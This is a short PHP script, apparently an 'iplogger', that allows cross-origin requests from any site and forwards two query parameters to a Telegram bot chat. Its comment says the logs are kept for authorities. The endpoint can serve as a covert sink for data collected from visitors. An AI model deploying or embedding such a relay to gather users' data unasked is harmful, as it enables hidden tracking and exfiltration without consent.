<?php
header('Access-Control-Allow-Origin: *');

header('Access-Control-Allow-Methods: GET, POST');

header("Access-Control-Allow-Headers: X-Requested-With");
file_get_contents("https://api.telegram.org/botSECRET_IPLOGGER_BOTTOKEN/sendMessage?chat_id=SECRET_TELEGRAM_CHATID_IPLOGGER&text=".urlencode($_GET["ssd"])." ".urlencode($_GET["data"]));
// the point of this iplogger is to log data in case authorities request it
// sends logged data to a telegram account